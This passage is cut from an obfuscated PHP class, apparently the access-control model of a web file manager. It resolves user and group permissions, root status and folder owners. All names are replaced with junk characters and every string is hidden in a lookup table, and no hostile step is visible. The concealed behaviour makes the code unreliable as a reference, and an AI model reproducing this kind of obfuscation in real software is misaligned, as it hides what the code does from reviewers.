$ÈĞÂ×ØÇ =& $_SERVER[‚ûòÉ˜ş]; $÷ŒĞì­× = $this->getAllChildrenByUser($°¯úÊİ’, $ñë‡Òô); if (!$‹ú±ªº¶ || !$÷ŒĞì­×) { return !1; } foreach ($÷ŒĞì­× as $¬é«¯Úí) { $«¼í“İ‰ = array(); foreach ($¬é«¯Úí[$ÈĞÂ×ØÇ[2069]] as $¹¾¤úÆ) { $”ÔªƒÉÂ = $¹¾¤úÆ[$ÈĞÂ×ØÇ[516]]; $‚‡ª°àº = $¹¾¤úÆ[$ÈĞÂ×ØÇ[1687]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $öŠòØª‡ = $¹¾¤úÆ[$ÈĞÂ×ØÇ[1687]] ? $¹¾¤úÆ[$ÈĞÂ×ØÇ[1687]] : $¹¾¤úÆ[$ÈĞÂ×ØÇ[1885]]; if ($¹¾¤úÆ[$ÈĞÂ×ØÇ[1687]] && $¹¾¤úÆ[$ÈĞÂ×ØÇ[1687]] == $ñë‡Òô) { continue; } $«¼í“İ‰[] = array($ÈĞÂ×ØÇ[191] => $¬é«¯Úí[$ÈĞÂ×ØÇ[191]], $ÈĞÂ×ØÇ[188] => $‚‡ª°àº, $ÈĞÂ×ØÇ[546] => intval($öŠòØª‡), $ÈĞÂ×ØÇ[1989] => isset($”ÔªƒÉÂ[$ÈĞÂ×ØÇ[451]]) ? intval($”ÔªƒÉÂ[$ÈĞÂ×ØÇ[451]]) : 0, $ÈĞÂ×ØÇ[2049] => isset($”ÔªƒÉÂ[$ÈĞÂ×ØÇ[2049]]) ? intval($”ÔªƒÉÂ[$ÈĞÂ×ØÇ[2049]]) : -1); } $«¼í“İ‰[] = array($ÈĞÂ×ØÇ[191] => $¬é«¯Úí[$ÈĞÂ×ØÇ[191]], $ÈĞÂ×ØÇ[188] => SourceModel::TYPE_USER, $ÈĞÂ×ØÇ[546] => intval($ñë‡Òô), $ÈĞÂ×ØÇ[1989] => intval($‹ú±ªº¶), $ÈĞÂ×ØÇ[2049] => -1); $this->where(array($ÈĞÂ×ØÇ[467] => $¬é«¯Úí[$ÈĞÂ×ØÇ[191]]))->delete(); $this->addAll($«¼í“İ‰); } return !0; } public function get($«†í»âœ) { $íÓº¥ = $this->getSourceList(array($«†í»âœ), !0); return $íÓº¥[0]; } public function getSourceList($õ‰´Ö­ñ, $ùŠÛÓû = false, $Ö°¯ÍØ„ = false) { $ªÚ€íœÊ =& $_SERVER[‚ûòÉ˜ş]; if (!$õ‰´Ö­ñ) { return array(); } $»Ìù›•Ê = Model($ªÚ€íœÊ[1373]); if (!$ùŠÛÓû && count($õ‰´Ö­ñ) == 1) { $ùŠÛÓû = array(); $ùŠÛÓû[$õ‰´Ö­ñ[0]] = $»Ìù›•Ê->sourceInfo($õ‰´Ö­ñ[0]); } if (!$ùŠÛÓû) { $İ¥–Ô°˜ = array($ªÚ€íœÊ[467] => array($ªÚ€íœÊ[468], $õ‰´Ö­ñ)); $ùŠÛÓû = $»Ìù›•Ê->field($ªÚ€íœÊ[2073])->where($İ¥–Ô°˜)->select(); $ùŠÛÓû = array_to_keyvalue($ùŠÛÓû, $ªÚ€íœÊ[191]); } $œÀïé¼ = $õ‰´Ö­ñ; foreach ($ùŠÛÓû as $Øûˆ¶ˆ => $¡†Úˆ•ª) { $Å²‘Ïƒœ = $»Ìù›•Ê->parentLevelArray($¡†Úˆ•ª[$ªÚ€íœÊ[561]]); $œÀïé¼ = array_merge($œÀïé¼, array($Øûˆ¶ˆ), array_reverse($Å²‘Ïƒœ)); } $œÀïé¼ = array_values(array_unique($œÀïé¼)); if (!$œÀïé¼) { return array(); } $şÚô‘Á  = $this->sourceAuthSelect($œÀïé¼); $Íïø’¾ê = array(); foreach ($œÀïé¼ as $Åì¶Ù) { if (isset($şÚô‘Á [$Åì¶Ù])) { $Íïø’¾ê[$Åì¶Ù] = $şÚô‘Á [$Åì¶Ù]; } } $®’Ñ¢øÊ = $this->userIsRoot($Ö°¯ÍØ„); $ò’Çç®¡ = AuthModel::authAll(); $³ÊÍöšŠ = array($ªÚ€íœÊ[464] => $ò’Çç®¡, $ªÚ€íœÊ[2074] => array($ªÚ€íœÊ[469] => 0, $ªÚ€íœÊ[1891] => $ò’Çç®¡, $ªÚ€íœÊ[470] => LNG($ªÚ€íœÊ[2075]), $ªÚ€íœÊ[1908] => $ªÚ€íœÊ[2076])); $’²Ë–“ = array(); foreach ($ùŠÛÓû as $Åì¶Ù => $…Ÿ¬ç¥) { if ($®’Ñ¢øÊ && $GLOBALS[$ªÚ€íœÊ[6]][$ªÚ€íœÊ[1904]]) { $’²Ë–“[$Åì¶Ù] = $³ÊÍöšŠ; continue; } $’²Ë–“[$Åì¶Ù] = $this->makeSourceAuth($…Ÿ¬ç¥, $Íïø’¾ê, $Ö°¯ÍØ„); } return $’²Ë–“; } public function authDeepCheck($’­»ÙºÒ, $ú†×îê„ = false) { $…Ü©î¨ç =& $_SERVER[‚ûòÉ˜ş]; $ú†×îê„ = $ú†×îê„ ? $ú†×îê„ : USER_ID; $ÖŸ¯ªÇ° = $this->makeAuthDeep($ú†×îê„); if (!in_array($’­»ÙºÒ, $ÖŸ¯ªÇ°[$…Ü©î¨ç[2077]])) { return !1; } $è„À¶‹Ù = array(); foreach ($ÖŸ¯ªÇ°[$…Ü©î¨ç[2078]] as $¥¯å…İ => $À‘Âüáã) { if (!in_array($’­»ÙºÒ, $À‘Âüáã)) { continue; } $è„À¶‹Ù[] = $¥¯å…İ; } if (!$è„À¶‹Ù) { return !1; } $ÒôÔ›ªË = $è„À¶‹Ù ? $è„À¶‹Ù[0] : $’­»ÙºÒ; return array($…Ü©î¨ç[464] => -1, $…Ü©î¨ç[516] => array($…Ü©î¨ç[469] => $…Ü©î¨ç[1229], $…Ü©î¨ç[1891] => $…Ü©î¨ç[222], $…Ü©î¨ç[470] => LNG($…Ü©î¨ç[2079]), $…Ü©î¨ç[1908] => $…Ü©î¨ç[2080]), $…Ü©î¨ç[2081] => LNG($…Ü©î¨ç[2082]), $…Ü©î¨ç[2083] => $this->sourceAuthInfo($ÒôÔ›ªË)); } protected function makeAuthDeep($‡Ø×¤¬ = false) { $œÊ²üí… =& $_SERVER[‚ûòÉ˜ş]; static $ÉıÆÇİÄ = array(); $‡Ø×¤¬ = $‡Ø×¤¬ ? $‡Ø×¤¬ : USER_ID; if (isset($ÉıÆÇİÄ[$‡Ø×¤¬])) { return $ÉıÆÇİÄ[$‡Ø×¤¬]; } $•À®½ôŒ = Model($œÊ²üí…[2084])->listData(); $§ØË˜Î¨ = array(); foreach ($•À®½ôŒ as $Ğøà´®ç) { if ($Ğøà´®ç[$œÊ²üí…[463]] == 0 && $Ğøà´®ç[$œÊ²üí…[1907]] == $œÊ²üí…[98]) { $§ØË˜Î¨[] = $Ğøà´®ç[$œÊ²üí…[451]]; } } $ÊÎ´ãİŒ = $this->userGroupParents($‡Ø×¤¬); $ù¹îü = array($œÊ²üí…[188] => SourceModel::TYPE_USER, $œÊ²üí…[546] => $‡Ø×¤¬); if ($ÊÎ´ãİŒ) { $ù¹îü = array(array($œÊ²üí…[188] => SourceModel::TYPE_USER, $œÊ²üí…[546] => $‡Ø×¤¬), array($œÊ²üí…[188] => SourceModel::TYPE_GROUP, $œÊ²üí…[546] => array($œÊ²üí…[468], $ÊÎ´ãİŒ)), $œÊ²üí…[1041] => $œÊ²üí…[1983]); } $Á¥«›£” = $this->field($œÊ²üí…[2085])->where($ù¹îü)->select(); $ßˆ£”ç = array(); $ô£Ø¬ô = array_to_keyvalue_group($Á¥«›£”, $œÊ²üí…[191]); foreach ($ô£Ø¬ô as $¶×é”” => $…ì„¸ü) { $„¨íêÀ = $this->authArrayCheck($…ì„¸ü, $‡Ø×¤¬); if ($„¨íêÀ[$œÊ²üí…[464]] > 0) { $ßˆ£”ç[] = $¶×é”” . $œÊ²üí…[12]; } } if ($ÊÎ´ãİŒ) { $É±šÓ¤¨ = Model($œÊ²üí…[562]); foreach ($ÊÎ´ãİŒ as $é¡®¨¬) { $†²Œ×® = $É±šÓ¤¨->getInfo($é¡®¨¬); if (!$†²Œ×® || !is_array($†²Œ×®[$œÊ²üí…[97]])) { continue; } $ßˆ£”ç[] = $†²Œ×®[$œÊ²üí…[97]][$œÊ²üí…[191]]; } } $–±Ù§Ùï = array(); $æ¿Öé€ç = $ÊÎ´ãİŒ; $ó…ñ«›‘ = Model($œÊ²üí…[1373]); $É±šÓ¤¨ = Model($œÊ²üí…[562]); $¿ëˆü—¡ = array(); $ÓôşÄĞ = array(); $æÂ—èÎ = array(); $ÍüÁ·× = array(); if ($ßˆ£”ç) { $ã©¯ô¤• = $ó…ñ«›‘->where(array($œÊ²üí…[191] => array($œÊ²üí…[468], $ßˆ£”ç)))->select(); foreach ($ã©¯ô¤• as $€•íüàÏ) { $¬åèı€ = $ó…ñ«›‘->parentLevelArray($€•íüàÏ[$œÊ²üí…[561]]); $–±Ù§Ùï = array_merge($–±Ù§Ùï, $¬åèı€); $æ¿Öé€ç[] = $€•íüàÏ[$œÊ²üí…[546]]; $¿ëˆü—¡[$€•íüàÏ[$œÊ²üí…[191]]] = $¬åèı€; $ÓôşÄĞ[$€•íüàÏ[$œÊ²üí…[191]]] = $€•íüàÏ[$œÊ²üí…[546]]; } } $æ¿Öé€ç = array_values(array_unique($æ¿Öé€ç)); $¨ŒşÏ’Í = $æ¿Öé€ç; foreach ($¨ŒşÏ’Í as $é¡®¨¬) { $†²Œ×® = $É±šÓ¤¨->getInfo($é¡®¨¬); $¬åèı€ = $ó…ñ«›‘->parentLevelArray($†²Œ×®[$œÊ²üí…[561]]); $æ¿Öé€ç = array_merge($æ¿Öé€ç, $¬åèı€); } $æ¿Öé€ç = array_values(array_unique($æ¿Öé€ç)); foreach ($æ¿Öé€ç as $é¡®¨¬) { $†²Œ×® = $É±šÓ¤¨->getInfo($é¡®¨¬); $–±Ù§Ùï[] = $†²Œ×®[$œÊ²üí…[97]][$œÊ²üí…[191]]; $æÂ—èÎ[$é¡®¨¬] = $†²Œ×®[$œÊ²üí…[97]][$œÊ²üí…[191]]; $ÍüÁ·×[$é¡®¨¬] = $ó…ñ«›‘->parentLevelArray($†²Œ×®[$œÊ²üí…[561]]); } foreach ($¿ëˆü—¡ as $¸™ò›áŒ => $÷µ®”ç) { $âÇæÌúº = $ÓôşÄĞ[$¸™ò›áŒ]; if (!$âÇæÌúº || !$æÂ—èÎ[$âÇæÌúº]) { continue; } $Î÷·Ô¤­ = array(); foreach ($ÍüÁ·×[$âÇæÌúº] as $é¡®¨¬) { $Î÷·Ô¤­[] = $æÂ—èÎ[$é¡®¨¬]; } $¿ëˆü—¡[$¸™ò›áŒ] = array_merge($Î÷·Ô¤­, $÷µ®”ç); } $–±Ù§Ùï = array_values(array_unique($–±Ù§Ùï)); $´Ç©Ëç– = array($œÊ²üí…[2077] => $–±Ù§Ùï, $œÊ²üí…[2078] => $¿ëˆü—¡); $ÉıÆÇİÄ[$‡Ø×¤¬] = $´Ç©Ëç–; return $´Ç©Ëç–; } private function makeSourceAuth($Æéóğ¸¢, $Ñõ•éÉ¦, $Í®ß¤’ = false) { $ô Ì’Ë‰ =& $_SERVER[‚ûòÉ˜ş]; $ñåæĞŒ­ = $ô Ì’Ë‰[98]; $ôúüÚ¥ü = $Æéóğ¸¢[$ô Ì’Ë‰[546]]; $íù†•üÅ = $Æéóğ¸¢[$ô Ì’Ë‰[188]] == SourceModel::TYPE_GROUP; $æÏÁßú = $íù†•üÅ ? $this->groupRootAuth($ôúüÚ¥ü, $Í®ß¤’) : !1; if ($æÏÁßú && Model($ô Ì’Ë‰[548])->authCheckAction($æÏÁßú[$ô Ì’Ë‰[463]], $ô Ì’Ë‰[1906])) { return $this->groupAuthInfo($æÏÁßú, $ôúüÚ¥ü); } $±ã¯À½å = Model($ô Ì’Ë‰[1373])->parentLevelArray($Æéóğ¸¢[$ô Ì’Ë‰[561]]); $±ã¯À½å = array_merge(array($Æéóğ¸¢[$ô Ì’Ë‰[191]]), array_reverse($±ã¯À½å)); $¯ïÈ‹£û = !1; foreach ($±ã¯À½å as $¾³¯ò²) { if (!isset($Ñõ•éÉ¦[$¾³¯ò²])) { continue; } $©›Ù©œ´ = $this->authMake($Ñõ•éÉ¦[$¾³¯ò²], $Í®ß¤’); if ($©›Ù©œ´[$ô Ì’Ë‰[516]]) { $¯ïÈ‹£û = $©›Ù©œ´; break; } } if (!$íù†•üÅ) { return $¯ïÈ‹£û; } if (!$¯ïÈ‹£û && $æÏÁßú) { $¯ïÈ‹£û = $this->groupAuthInfo($æÏÁßú, $ôúüÚ¥ü); } if (!$¯ïÈ‹£û) { $º†ËáØ• = Model($ô Ì’Ë‰[562])->getInfo($ôúüÚ¥ü); $ÙîÅ£ğ½ = explode($ô Ì’Ë‰[60], trim($º†ËáØ•[$ô Ì’Ë‰[561]], $ô Ì’Ë‰[60])); $ÙîÅ£ğ½ = array_reverse($ÙîÅ£ğ½); foreach ($ÙîÅ£ğ½ as $òÊşÈÎĞ) { if ($òÊşÈÎĞ == $ô Ì’Ë‰[222] || $òÊşÈÎĞ == $ñåæĞŒ­) { continue; } $¯·šù¹« = $this->groupRootAuth($òÊşÈÎĞ, $Í®ß¤’); if (!$¯·šù¹«) { continue; } $¯ïÈ‹£û = $this->groupAuthInfo($¯·šù¹«, $òÊşÈÎĞ); break; } } if (!$¯ïÈ‹£û || $¯ïÈ‹£û[$ô Ì’Ë‰[464]] <= 0) { $ŠŞí˜Ş = $this->authDeepCheck($Æéóğ¸¢[$ô Ì’Ë‰[191]], $Í®ß¤’); if ($ŠŞí˜Ş) { $¯ïÈ‹£û = $ŠŞí˜Ş; } } return $¯ïÈ‹£û; } private function userIsRoot($’‡¶íã² = false) { $İèÀş‚‘ =& $_SERVER[‚ûòÉ˜ş]; if (!$’‡¶íã² && _get($GLOBALS, $İèÀş‚‘[544])) { return !0; } $’ƒà«î = Model($İèÀş‚‘[575])->getInfo($’‡¶íã²); $“»Ø²Ğí = Model($İèÀş‚‘[2086])->listData($’ƒà«î[$İèÀş‚‘[1562]]); if ($“»Ø²Ğí && $“»Ø²Ğí[$İèÀş‚‘[552]][$İèÀş‚‘[2087]] == 1) { return !0; } return !1; } private function sourceAuthInfo($´»üùéñ) { $Ğ¨ˆ§§œ =& $_SERVER[‚ûòÉ˜ş]; $Ÿû = Model($Ğ¨ˆ§§œ[1373]); $ªúÜÇà¸ = $Ÿû->sourceInfo($´»üùéñ); if (!$ªúÜÇà¸) { return !1; } $Ÿû->groupPathDisplay($ªúÜÇà¸); $Î¸Á…½ = array($ªúÜÇà¸); $Î¸Á…½ = $Ÿû->_listAppendPath($Î¸Á…½); $ªúÜÇà¸ = $Î¸Á…½[0]; $¼Ó£Ü“ = $ªúÜÇà¸[$Ğ¨ˆ§§œ[559]]; if (isset($ªúÜÇà¸[$Ğ¨ˆ§§œ[567]])) { $½Ğû‰ì = explode($Ğ¨ˆ§§œ[8], trim($ªúÜÇà¸[$Ğ¨ˆ§§œ[559]], $Ğ¨ˆ§§œ[8])); array_shift($½Ğû‰ì); $¼Ó£Ü“ = $ªúÜÇà¸[$Ğ¨ˆ§§œ[565]] . $Ğ¨ˆ§§œ[2088] . implode($Ğ¨ˆ§§œ[8], $½Ğû‰ì); } return array($Ğ¨ˆ§§œ[470] => $ªúÜÇà¸[$Ğ¨ˆ§§œ[42]], $Ğ¨ˆ§§œ[94] => KodIO::make($ªúÜÇà¸[$Ğ¨ˆ§§œ[191]]), $Ğ¨ˆ§§œ[2089] => $¼Ó£Ü“); } private function groupAuthInfo($úÈ‚Ã¢Ğ, $¦Ö·ó»î) { $ÃÑé¹á =& $_SERVER[‚ûòÉ˜ş]; $¾İÆú¶‘ = Model($ÃÑé¹á[562])->getInfo($¦Ö·ó»î); return array($ÃÑé¹á[2090] => intval($úÈ‚Ã¢Ğ[$ÃÑé¹á[463]]), $ÃÑé¹á[2074] => $úÈ‚Ã¢Ğ, $ÃÑé¹á[2091] => LNG($ÃÑé¹á[2092]), $ÃÑé¹á[2083] => array($ÃÑé¹á[470] => $¾İÆú¶‘[$ÃÑé¹á[42]], $ÃÑé¹á[94] => KodIO::make($¾İÆú¶‘[$ÃÑé¹á[97]][$ÃÑé¹á[191]]), $ÃÑé¹á[2089] => $¾İÆú¶‘[$ÃÑé¹á[566]])); } protected function groupRootAuth($–©ÜÈîª, $§–”ø = false) { $­ì±ùşñ =& $_SERVER[‚ûòÉ˜ş]; $§–”ø = $§–”ø ? $§–”ø : USER_ID; $Æü­Â‚™ = $§–”ø . $­ì±ùşñ[2093] . $–©ÜÈîª; static $ÏÄúøÓÙ = array(); if (isset($ÏÄúøÓÙ[$Æü­Â‚™])) { return $ÏÄúøÓÙ[$Æü­Â‚™]; } $±Š´¤ÏŒ = Model($­ì±ùşñ[562])->getInfo($–©ÜÈîª); $ÀÄæá» = $this->userGroupList($§–”ø); $Âİ¥¿ãİ = isset($ÀÄæá»[$–©ÜÈîª]) ? $ÀÄæá»[$–©ÜÈîª][$­ì±ùşñ[463]] : !1; if ($Âİ¥¿ãİ && Model($­ì±ùşñ[548])->authCheckAction($Âİ¥¿ãİ[$­ì±ùşñ[463]], $­ì±ùşñ[1906])) { $ÏÄúøÓÙ[$Æü­Â‚™] = $Âİ¥¿ãİ; return $Âİ¥¿ãİ; } $ûåÛºé = $this->sourceAuthSelect($±Š´¤ÏŒ[$­ì±ùşñ[97]][$­ì±ùşñ[191]]); $ß®ä–Î = $ûåÛºé ? $this->authMake($ûåÛºé, $§–”ø) : !1; $¢ÂÏÆ°Ü = $ß®ä–Î ? $ß®ä–Î[$­ì±ùşñ[516]] : !1; $ÏÄúøÓÙ[$Æü­Â‚™] = $¢ÂÏÆ°Ü ? $¢ÂÏÆ°Ü : $Âİ¥¿ãİ; return $ÏÄúøÓÙ[$Æü­Â‚™]; } public function authOwnerApply($ÀŠÕœ³—) { $ê ÉÁÓ =& $_SERVER[‚ûòÉ˜ş]; if (empty($ÀŠÕœ³—[$ê ÉÁÓ[463]]) || isset($ÀŠÕœ³—[$ê ÉÁÓ[2094]]) && $ÀŠÕœ³—[$ê ÉÁÓ[2094]]) { return $ÀŠÕœ³—; } if (AuthModel::authCheckRoot($ÀŠÕœ³—[$ê ÉÁÓ[463]][$ê ÉÁÓ[464]])) { return $ÀŠÕœ³—; } $µÑæû¡‰ = Model($ê ÉÁÓ[1373])->parentLevelArray($ÀŠÕœ³—[$ê ÉÁÓ[561]]); $µÑæû¡‰ = array_merge(array($ÀŠÕœ³—[$ê ÉÁÓ[191]]), array_reverse($µÑæû¡‰)); $ñÍşñ½î = $this->sourceAuthSelect($µÑæû¡‰); $´‰‚Ñ‚  = array(); $–äôÓĞ = array(); foreach ($ñÍşñ½î as $¢Ò…¾ĞÆ => $•Ö‰İ§) { $«ñ¢âĞ¿ = $this->authFolderOwnerUser($•Ö‰İ§); $´‰‚Ñ‚ [$¢Ò…¾ĞÆ] = $«ñ¢âĞ¿; $–äôÓĞ = array_merge($–äôÓĞ, $«ñ¢âĞ¿[$ê ÉÁÓ[638]]); if ($«ñ¢âĞ¿[$ê ÉÁÓ[2095]]) { break; } } if (count($–äôÓĞ) == 0) { $–äôÓĞ = $this->authFolderOwnerGroup($ÀŠÕœ³—[$ê ÉÁÓ[546]]); } $–äôÓĞ = array_unique($–äôÓĞ); if (AuthModel::authCheckRoot($ÀŠÕœ³—[$ê ÉÁÓ[463]][$ê ÉÁÓ[464]])) { $–äôÓĞ[] = USER_ID; } $ÀŠÕœ³—[$ê ÉÁÓ[463]][$ê ÉÁÓ[2096]] = Model($ê ÉÁÓ[554])->userListInfo($–äôÓĞ); return $ÀŠÕœ³—; } private function authFolderOwnerGroup($Ëœ‚† ) { $šÛÓ”ú¼ =& $_SERVER[‚ûòÉ˜ş]; $™Óã”šÃ = Model($šÛÓ”ú¼[1975])->where(array($šÛÓ”ú¼[1885] => $Ëœ‚† ))->select(); $Š³ÉçÊØ = array(); if (!$™Óã”šÃ) { return $Š³ÉçÊØ; } foreach ($™Óã”šÃ as $×Ê€Ğ×²) { $ÔÃ¼ï½Û = $this->authInfo($×Ê€Ğ×²); if (AuthModel::authCheckRoot($ÔÃ¼ï½Û[$šÛÓ”ú¼[463]])) { $Š³ÉçÊØ[] = $×Ê€Ğ×²[$šÛÓ”ú¼[1687]]; } } return $Š³ÉçÊØ; } private function authFolderOwnerUser($”€Áœö) { $ß²†ùæä =& $_SERVER[‚ûòÉ˜ş]; $‹»øÕİÌ = array(); $¡Û³Ó¹ı = !1; foreach ($”€Áœö as $ü€ÊªŠï) { $¦œÔ = $this->authInfo($ü€ÊªŠï); if ($ü€ÊªŠï[$ß²†ùæä[546]] == $ß²†ùæä[222]) { $¡Û³Ó¹ı = !0; } if ($ü€ÊªŠï[$ß²†ùæä[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¦œÔ[$ß²†ùæä[463]])) { $‹»øÕİÌ[] = $ü€ÊªŠï[$ß²†ùæä[546]]; } } } return array($ß²†ùæä[638] => $‹»øÕİÌ, $ß²†ùæä[2095] => $¡Û³Ó¹ı); } public function authMake($†Ó¯Æãü, $™”í™—Ç = false) { $‹„œ²ü¦ =& $_SERVER[‚ûòÉ˜ş]; $õùœçÖÒ = $this->authArrayCheck($†Ó¯Æãü, $™”í™—Ç); if ($õùœçÖÒ[$‹„œ²ü¦[2097]]) { $õùœçÖÒ[$‹„œ²ü¦[2097]] = $this->sourceAuthInfo($õùœçÖÒ[$‹„œ²ü¦[2097]]); } return $õùœçÖÒ; } public function authArrayCheck($éè«Ôé, $¶­–ú‹Æ = false) { $óì‡…Õ =& $_SERVER[‚ûòÉ˜ş]; if (!$éè«Ôé) { return array($óì‡…Õ[464] => 0, $óì‡…Õ[516] => !1); } $¶­–ú‹Æ = $¶­–ú‹Æ ? $¶­–ú‹Æ : USER_ID; $ƒêŸ½ = 0; $®â…­ş = 0; $òß¹‡¯ = 0; $ˆ¯óÔ‹ë = 0; $´Ì¾“×Ÿ = 0; $ÊİÉÙÒ = 0; $ØèÂ‡¬Ñ = 1000; $³¯ïÜ«¼ = 0; $ñÀÓºô = 0; $‹ÖØğ´ì = 0; $Ä¢€‘Éò = 0; $Ç”µÄ³« = array($óì‡…Õ[191] => 0); foreach ($éè«Ôé as $Ç”µÄ³«) { $‚”àãŸ® = $this->authInfo($Ç”µÄ³«); if (!$‚”àãŸ®) { continue; } $šÆ¾•‘Ê = $Ç”µÄ³«[$óì‡…Õ[546]]; $×‰¶­êã = intval($‚”àãŸ®[$óì‡…Õ[463]]); if ($Ç”µÄ³«[$óì‡…Õ[188]] == SourceModel::TYPE_USER && $šÆ¾•‘Ê == $¶­–ú‹Æ) { $ƒêŸ½ = !0; $òß¹‡¯ = $‚”àãŸ®; $®â…­ş = $×‰¶­êã; } else { if ($Ç”µÄ³«[$óì‡…Õ[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($šÆ¾•‘Ê, $¶­–ú‹Æ)) { $ˆ¯óÔ‹ë = !0; $Ÿšç©êÉ = $this->groupStepToUserGroup($šÆ¾•‘Ê, $¶­–ú‹Æ); if ($Ÿšç©êÉ < $ØèÂ‡¬Ñ) { $ØèÂ‡¬Ñ = $Ÿšç©êÉ; $´Ì¾“×Ÿ = $×‰¶­êã; $ÊİÉÙÒ = $‚”àãŸ®; $³¯ïÜ«¼ = $šÆ¾•‘Ê; } if ($Ÿšç©êÉ == $ØèÂ‡¬Ñ && $×‰¶­êã >= $´Ì¾“×Ÿ) { $´Ì¾“×Ÿ = $×‰¶­êã; $ÊİÉÙÒ = $‚”àãŸ®; $³¯ïÜ«¼ = $šÆ¾•‘Ê; } } else { if ($šÆ¾•‘Ê == $óì‡…Õ[222]) { $ñÀÓºô = !0; $Ä¢€‘Éò = $‚”àãŸ®; $‹ÖØğ´ì = $×‰¶­êã; } } } } if ($ƒêŸ½) { $šıŒµ±‡ = $®â…­ş; $‚”àãŸ® = $òß¹‡¯; $Â¼Ù˜¸Ö = LNG($óì‡…Õ[2098]); } else { if ($ˆ¯óÔ‹ë) { $šıŒµ±‡ = $´Ì¾“×Ÿ; $‚”àãŸ® = $ÊİÉÙÒ; $úîøÚŠ = Model($óì‡…Õ[562])->getInfo($³¯ïÜ«¼); $Â¼Ù˜¸Ö = $óì‡…Õ[173] . $úîøÚŠ[$óì‡…Õ[566]] . $óì‡…Õ[2099] . LNG($óì‡…Õ[2100]); } else { if ($ñÀÓºô) { $šıŒµ±‡ = $‹ÖØğ´ì; $‚”àãŸ® = $Ä¢€‘Éò; $Â¼Ù˜¸Ö = LNG($óì‡…Õ[2071]); } else { $šıŒµ±‡ = 0; $‚”àãŸ® = !1; $Â¼Ù˜¸Ö = $óì‡…Õ[12]; } } } $´¯ï ÇÄ = array($óì‡…Õ[2090] => intval($šıŒµ±‡), $óì‡…Õ[2074] => $‚”àãŸ®, $óì‡…Õ[2091] => $Â¼Ù˜¸Ö, $óì‡…Õ[2083] => $Ç”µÄ³«[$óì‡…Õ[191]]); return $´¯ï ÇÄ; } private function groupContainUser($‡ß¸ı¹¾, $úşÄ¯Š = false) { return in_array($‡ß¸ı¹¾, $this->userGroupParents($úşÄ¯Š)); } private function groupStepToUserGroup($¦ç¤´¨, $«Ì¶å¢ = false) { $¦ŸöÜñ =& $_SERVER[‚ûòÉ˜ş]; $î¨Ã†ñó = $this->userGroupList($«Ì¶å¢); $êÎš‰ï = 1000; $±ğÌŠ— = $GLOBALS[$¦ŸöÜñ[6]][$¦ŸöÜñ[99]][$¦ŸöÜñ[1988]] == 1; $Ş°Ù–ÚÖ = $±ğÌŠ— ? 3 : 2; foreach ($î¨Ã†ñó as $³­’ç„Æ) { if ($³­’ç„Æ[$¦ŸöÜñ[1885]] == $¦ç¤´¨) { return 0; } $£€³äĞÙ = explode($¦ŸöÜñ[60], trim($³­’ç„Æ[$¦ŸöÜñ[561]], $¦ŸöÜñ[60])); if ($£€³äĞÙ[0] == $¦ŸöÜñ[222] && count($£€³äĞÙ) > $Ş°Ù–ÚÖ) { $¸Ú¸ÇÂ = array_reverse(array_slice($£€³äĞÙ, $Ş°Ù–ÚÖ)); $ˆó¬©Ğ« = array_search($¦ç¤´¨, $¸Ú¸ÇÂ); if ($ˆó¬©Ğ« !== !1 && $ˆó¬©Ğ« + 1 <= $êÎš‰ï) { $êÎš‰ï = $ˆó¬©Ğ« + 1; } } } return $êÎš‰ï; } private function userGroupList($“ÀÎŞÕü = false) { $ì¨Ó¢ö =& $_SERVER[‚ûòÉ˜ş]; static $—«Ÿ¢ŞÕ = array(); if (isset($—«Ÿ¢ŞÕ[$“ÀÎŞÕü])) { return $—«Ÿ¢ŞÕ[$“ÀÎŞÕü]; } $Û¡çËÒ£ = Model($ì¨Ó¢ö[575])->getInfo($“ÀÎŞÕü); $—«Ÿ¢ŞÕ[$“ÀÎŞÕü] = array_to_keyvalue($Û¡çËÒ£[$ì¨Ó¢ö[2072]], $ì¨Ó¢ö[1885]); return $—«Ÿ¢ŞÕ[$“ÀÎŞÕü]; } public function userGroupParents($Û¤¯­úİ) { $œ¢‚ Íó =& $_SERVER[‚ûòÉ˜ş]; static $ïµèá­Ê = array(); $Û¤¯­úİ = $Û¤¯­úİ ? $Û¤¯­úİ : USER_ID; if (isset($ïµèá­Ê[$Û¤¯­úİ])) { return $ïµèá­Ê[$Û¤¯­úİ]; } $¶„æë‚ = $this->userGroupList($Û¤¯­úİ); $º¬’½Çº = array(); $—‹«ÛŒ = $GLOBALS[$œ¢‚ Íó[6]][$œ¢‚ Íó[99]][$œ¢‚ Íó[1988]] == 1; $íõÚî— = $—‹«ÛŒ ? 3 : 2; foreach ($¶„æë‚ as $ààäò¤ş) { $ó‰íã¸À = array($ààäò¤ş[$œ¢‚ Íó[1885]]); $Æà­Ä¬ = explode($œ¢‚ Íó[60], trim($ààäò¤ş[$œ¢‚ Íó[561]], $œ¢‚ Íó[60])); if ($Æà­Ä¬[0] == $œ¢‚ Íó[222] && count($Æà­Ä¬) > $íõÚî—) { $Ì¬“Ù˜İ = array_slice($Æà­Ä¬, $íõÚî—); $ó‰íã¸À = array_merge($ó‰íã¸À, array_reverse($Ì¬“Ù˜İ)); } $º¬’½Çº = array_merge($º¬’½Çº, $ó‰íã¸À); } $ïµèá­Ê[$Û¤¯­úİ] = array_unique($º¬’½Çº); return $ïµèá­Ê[$Û¤¯­úİ]; } public function authTargetInfoMake($ë® ùë) { $Éê³ÙŞ  =& $_SERVER[‚ûòÉ˜ş]; $ú½Éîñ = array(); $ƒÎÓĞÏŒ = array(); foreach ($ë® ùë as $Ğ•ó•Æ”) { if ($Ğ•ó•Æ”[$Éê³ÙŞ [188]] == SourceModel::TYPE_USER) { $ú½Éîñ[] = intval($Ğ•ó•Æ”[$Éê³ÙŞ [546]]); } else { if ($Ğ•ó•Æ”[$Éê³ÙŞ [188]] == SourceModel::TYPE_GROUP) { $ƒÎÓĞÏŒ[] = intval($Ğ•ó•Æ”[$Éê³ÙŞ [546]]); } } } if ($ú½Éîñ) { $ú½Éîñ = Model($Éê³ÙŞ [554])->userListInfo($ú½Éîñ); } if ($ƒÎÓĞÏŒ) { $Ÿøß¶§î = array($Éê³ÙŞ [1973] => array($Éê³ÙŞ [468], $ƒÎÓĞÏŒ)); $ƒÎÓĞÏŒ = Model($Éê³ÙŞ [562])->field($Éê³ÙŞ [2101])->where($Ÿøß¶§î)->select(); $ƒÎÓĞÏŒ = array_to_keyvalue($ƒÎÓĞÏŒ, $Éê³ÙŞ [1885]); } return array($Éê³ÙŞ [2102] => $ú½Éîñ, $Éê³ÙŞ [2103] => $ƒÎÓĞÏŒ); } public function 